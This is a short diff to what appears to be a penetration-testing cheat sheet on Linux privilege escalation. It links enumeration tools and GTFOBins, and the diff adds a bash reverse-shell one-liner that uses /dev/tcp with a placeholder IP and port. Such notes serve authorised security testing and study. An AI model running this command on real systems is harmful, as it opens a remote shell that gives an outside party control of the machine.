@@ -9,3 +9,5 @@ Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeratio
 Linux Priv Checker: https://github.com/linted/linuxprivchecker<br>
 
 Exploit for every sudo app for the user (sudo -l): https://gtfobins.github.io/
+
+Reverse shell command:  bash -i >& /dev/tcp/<ip>/<port> 0>&1
